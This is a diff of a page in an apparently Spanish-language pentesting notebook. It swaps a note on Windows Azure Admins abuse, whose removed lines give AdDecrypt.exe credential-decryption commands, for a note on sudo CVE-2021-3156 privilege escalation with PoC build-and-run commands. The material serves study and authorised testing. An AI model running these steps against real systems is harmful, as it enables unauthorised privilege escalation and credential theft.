@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
-    <title>Azure Admins | Notebook</title>
+    <title>Versión de sudo | Notebook</title>
     <script src="/theme.js"></script>
     <link rel="stylesheet" href="/section.css" />
   </head>
@@ -15,9 +15,9 @@
       <section class="notebook-workspace" aria-label="Notebook">
         <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
 
-        <article class="note-panel is-active" id="azure-admins">
+        <article class="note-panel is-active" id="version-sudo">
           <div class="note-tabbar">
-            <span>Azure Admins</span>
+            <span>Versión de sudo</span>
             <details class="notebook-tag-search">
               <summary>Buscar tags</summary>
               <label>
@@ -26,44 +26,41 @@
               </label>
               <div class="notebook-search-results" aria-live="polite"></div>
             </details>
-            <span>~/notebook/Escalada de Privilegios/Windows/Grupos</span>
+            <span>~/notebook/Escalada de Privilegios/Linux/Kernel y versiones</span>
           </div>
 
           <div class="note-content">
-            <p class="eyebrow">escalada de privilegios / windows / grupos</p>
-            <h2>Azure Admins</h2>
+            <p class="eyebrow">escalada de privilegios / linux / kernel y versiones</p>
+            <h2>Versión de sudo</h2>
 
-            <p><a href="https://github.com/VbScrub/AdSyncDecrypt">Repositorio GitHub</a> <a href="https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip">Payloads.zip</a></p>
+            <p>La versión de sudo puede indicar vulnerabilidades conocidas, pero siempre hay que confirmar configuración, distribución, parches backportados y condiciones exactas de explotación.</p>
 
+            <aside class="callout warning">
+              <p>Valida siempre la versión exacta, arquitectura y alcance antes de ejecutar exploits públicos. En sistemas reales, evita técnicas destructivas y trabaja solo con autorización.</p>
+            </aside>
+
+            <p>Ejemplo de PoC pública para <a href="https://github.com/1N53C/CVE-2021-3156-PoC">CVE-2021-3156</a>. Antes de usarla hay que validar versión, distribución y parches aplicados, porque muchas distros hacen backport de correcciones sin cambiar de forma evidente la versión mostrada.</p>
             <section class="code-card">
-              <h3>Subir payloads y Ejecutarlo desde esa ruta</h3>
-              <pre><code># Subir payload AdDecrypt.exe
-# Subir payload mcrypt.dll
-cd 'C:\Program Files\Microsoft Azure AD Sync\Bin'
-# Ruta AdDecrypt.exe y mcrypt.dll
-C:\Users\&lt;user&gt;\Desktop\AdDecrypt.exe -FullSQL</code></pre>
+              <h3>Versión sudo vulnerable</h3>
+              <pre><code>sudo -V
+# Sudo version 1.8.31
+# Transferir Makefile, hax.c, lib.c
+make
+./sudo-hax-me-a-sandwich
+./sudo-hax-me-a-sandwich 1</code></pre>
             </section>
-
             <figure class="note-figure">
-              <img src="/notebook/assets/obsidian/windows-azure-admins.png" alt="Abuso del grupo Azure Admins" />
+              <img src="/notebook/assets/obsidian/linux-sudo-version.png" alt="Comprobación de versión de sudo" />
             </figure>
-
-            <h2>Máquinas relacionadas</h2>
-            <div class="notebook-related-links">
-              <a href="/writeups.html?machine=monteverde">Monteverde</a>
-            </div>
 
             <h2>Tags</h2>
             <div class="tag-list">
               <span>notebook</span>
-              <span>windows</span>
+              <span>linux</span>
               <span>privesc</span>
               <span>escalada_privilegios</span>
-              <span>grupos</span>
-              <span>active_directory</span>
-              <span>azure</span>
-              <span>admins</span>
-              <span>azure_admins</span>
+              <span>sudo</span>
+              <span>cve_2021_3156</span>
             </div>
           </div>
         </article>
